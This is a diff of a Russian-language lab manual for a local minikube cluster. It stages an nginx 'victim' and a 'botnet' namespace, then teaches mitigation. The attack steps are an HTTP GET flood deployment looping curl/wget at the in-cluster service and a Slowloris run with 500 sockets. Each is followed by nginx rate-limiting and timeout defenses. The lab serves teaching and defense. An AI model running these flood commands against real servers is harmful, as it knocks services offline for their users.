@@ -8,85 +8,86 @@
 Если вывод команды не пустой и вы видите слова vmx или svm — значит можно продолжать.
 Для управления кластером Kubernetes используется ПО kubectl. Для установки необходимо:
 1)	загрузить последнюю версию и сделать загруженный бинарный файл kubectl исполняемым:
-curl  LO https://dl.k8s.io/release/`curl  LS https://dl.k8s.io/release/stable.txt`/bin/linux/amd64/kubectl
-chmod +x ./kubectl
+`curl  LO https://dl.k8s.io/release/`curl  LS https://dl.k8s.io/release/stable.txt`/bin/linux/amd64/kubectl`
+`chmod +x ./kubectl`
 2)	переместить бинарный файл в директорию из переменной окружения PATH и проверим версию ПО
-sudo mv ./kubectl /usr/local/bin/kubectl
-kubectl version --client
+`sudo mv ./kubectl /usr/local/bin/kubectl`
+`kubectl version --client`
  
 Minikube запускается либо в ВМ, либо в контейнере как в нашем случае. Для его работы потребуется Docker, чтобы его установить выполните следующие действия:
-sudo apt update
-sudo apt-get install curl wget apt-transport-https virtualbox virtualbox-ext-pack -y
-sudo apt-get install docker.io -y
+`sudo apt update`
+`sudo apt-get install curl wget apt-transport-https virtualbox virtualbox-ext-pack -y`
+`sudo apt-get install docker.io -y`
 Чтобы проверить, что Docker установлен и запущен используются следующие команды:
-docker --version
-systemctl status docker (systemctl start docker, если не запущен)
+`docker --version`
+`systemctl status docker `(systemctl start docker, если не запущен)
 Так же необходимо добавить текущего пользователя в группу Docker, чтобы иметь возможность запуска без sudo
-sudo usermod -aG docker $USER && newgrp docker
+`sudo usermod -aG docker $USER && newgrp docker`
  
 Чтобы установить minikube воспользуйтесь следующими командами:
-curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64
-sudo install minikube-linux-amd64 /usr/local/bin/minikube
-rm minikube-linux-amd64
+`curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64`
+`sudo install minikube-linux-amd64 /usr/local/bin/minikube`
+`rm minikube-linux-amd64`
 Чтобы начать работать запустите кластер k8s (драйвер docker будет выбран автоматически)
-minikube start --cpus 2 --memory=3072 --network-plugin=cni --cni=calico 
+`minikube start --cpus 2 --memory=3072 --network-plugin=cni --cni=calico `
 Внимание: из-за сильного ограничения ресурсов инициализация кластера и скачивание образов могут занять 3–5 минут. Пожалуйста, дождитесь полного запуска.
 Проверьте статус кластера:
-minikube status
+`minikube status`
 Убедитесь, что компоненты host, kubelet и apiserver находятся в статусе Running
  
  
 # 2. Сценарий выполнения работы
 ## 2.1 Настройка веб-сервера
 Создайте следующие пространства имен для «жертвы» и «ботнета»
-kubectl create namespace victim
-kubectl create namespace botnet
+`kubectl create namespace victim`
+`kubectl create namespace botnet`
  
 В качестве «жертвы» используется веб-сервер nginx, его конфигурация должна хранится в файле target.yaml:
 Создайте файл target.yaml
 
 Чтобы запустить «под» веб-сервера воспользуйтесь командой
-kubectl apply -f target.yaml
+`kubectl apply -f target.yaml`
  
 Для просмотра статусов «подов» и получения их имён используется команда 
-kubectl get pods -n <namespace>
+`kubectl get pods -n <namespace>`
  
 Для проверки, что веб-сервер запущен зайдем на него (важно! – нужно запомнить команды) и отправим запрос на получение веб-страницы
-kubectl exec -it -n victim target-server -- sh
-curl -I http://localhost/
+`kubectl exec -it -n victim target-server -- sh`
+`curl -I http://localhost/`
 Если ответ, код – 200, и страница получена, всё успешно.
  
  
 ## 2.2	HTTP GET Flood
 Чтобы начать атаку, при которой «ботнет» отправляет на сервер массовое количество HTTP GET-запросов, мы будем использовать стандартные средства развертывания Kubernetes. Это позволит эмулировать распределенную нагрузку.
 Для создания развертывания (Deployment) с атакующими контейнерами выполните следующую команду. Она создаст поды на базе образа alpine, которые будут бесконечно в цикле отправлять запросы к веб-серверу:
-kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- sh -c "apk add --no-cache curl && while true; do curl -s http://target-service.victim.svc.cluster.local > /dev/null; done"
+`kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- sh -c "apk add --no-cache curl && while true; do curl -s http://target-service.victim.svc.cluster.local > /dev/null; done"`
 или 
-kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- /bin/sh -c "while true; do wget -q -O- http://target-service.victim.svc.cluster.local > /dev/null; done"
+`kubectl create deployment bot-get-flood --image=dockerhub.timeweb.cloud/library/alpine:latest -n botnet -- /bin/sh -c "while true; do wget -q -O- http://target-service.victim.svc.cluster.local > /dev/null; done"`
  
 Для увеличения мощности атаки (масштабирования ботнета) увеличьте количество реплик (подов):
-kubectl scale deployment bot-get-flood --replicas=5 -n botnet
+`kubectl scale deployment bot-get-flood --replicas=5 -n botnet`
  
 
 Проверьте загрузку CPU с помощью утилиты top. Также подсчитайте количество запросов к серверу:
-kubectl exec -it -n victim target-server -- sh
-top
-cat /var/log/nginx/access.log | wc -l
+`kubectl exec -it -n victim target-server -- sh`
+`top`
+`cat /var/log/nginx/access.log | wc -l`
  
  
  
 Чтобы просмотреть, с каких адресов идёт больше всего запросов, воспользуйтесь командой:
-awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 5
+`awk '{print $1}' /var/log/nginx/access.log | sort | uniq -c | sort -nr | head -n 5`
  
 Также логи можно посмотреть с помощью команды:
-kubectl logs -f target-server -n victim
+`kubectl logs -f target-server -n victim`
 
 Защита:
 Чтобы защититься от подобной атаки, необходимо настроить ограничение частоты запросов на веб-сервере (Rate Limiting).
 Внесите изменения в конфигурационный файл /etc/nginx/conf.d/default.conf внутри пода:
 Удалите старую read-only ссылку:
-rm /etc/nginx/conf.d/default.conf
+`rm /etc/nginx/conf.d/default.conf`
 Создайте файл заново с помощью утилиты echo (вставляем конфигурацию одной командой):
+```
 cat << 'EOF' > /etc/nginx/conf.d/default.conf
 limit_req_zone $binary_remote_addr zone=l7_limit:10m rate=5r/s;
 server {
@@ -98,45 +99,47 @@ server {
     }
 }
 EOF
+```
 Перезапустите конфигурацию Nginx:
-nginx -s reload
+`nginx -s reload`
  
 Продиагностируйте, что теперь произойдет с атакой. Сервер должен начать возвращать статус 503 Service Unavailable для избыточных запросов, сохраняя доступность. 
-kubectl logs target-server -n victim | grep " 503"
+`kubectl logs target-server -n victim | grep " 503"`
  
 После проверки остановите атаку:
-kubectl delete deployment bot-get-flood -n botnet
+`kubectl delete deployment bot-get-flood -n botnet`
  
  
 
 ## 2.3	Slowloris (L7 Slow Attack)
 Для обхода блокировок по Rate Limiting злоумышленник может открыть HTTP-соединение и отсылать заголовки пакетов крайне медленно, исчерпывая пул свободных потоков сервера (L7-атака).
-kubectl run bot-slowloris -it --rm --image=dockerhub.timeweb.cloud/library/python:3.9-slim -n botnet -- bash
+`kubectl run bot-slowloris -it --rm --image=dockerhub.timeweb.cloud/library/python:3.9-slim -n botnet -- bash`
 Внутри запущенного контейнера установите утилиту
-pip install slowloris
+`pip install slowloris`
  
 Запустите атаку:
-slowloris <victim_name> -p 80 -s 500
+`slowloris <victim_name> -p 80 -s 500`
  
 Примечание: не закрывайте терминал, атака идет в реальном времени.
 
 В отдельном окне терминала зайдите на сервер-жертву и проверьте активные сессии:
-netstat -an | grep :80 | grep ESTABLISHED
+`netstat -an | grep :80 | grep ESTABLISHED`
 Также попытайтесь сделать легитимный запрос через curl http://localhost/ — сервер перестанет отвечать.
  
 
 Защита:
 Чтобы предотвратить данную атаку, необходимо настроить веб-сервер на агрессивный разрыв «медленных» соединений с помощью таймаутов.
 Отредактируйте /etc/nginx/conf.d/default.conf, добавив в блок server:
+```
 client_body_timeout 5s;
 client_header_timeout 5s;
 keepalive_timeout 5s;
 send_timeout 5s;
- 
+ ```
 Примените изменения (nginx -s reload). Проверьте лог доступа, отфильтровав его по HTTP-коду 408 (Request Timeout), чтобы убедиться, что Nginx принудительно закрывает зависшие соединения.
-kubectl logs target-server -n victim | grep " 408 "
+`kubectl logs target-server -n victim | grep " 408 "`
 Или зайдите в под и посмотрите напрямую:
-cat /var/log/nginx/access.log | grep " 408 "
+`cat /var/log/nginx/access.log | grep " 408 "`
  
 
  
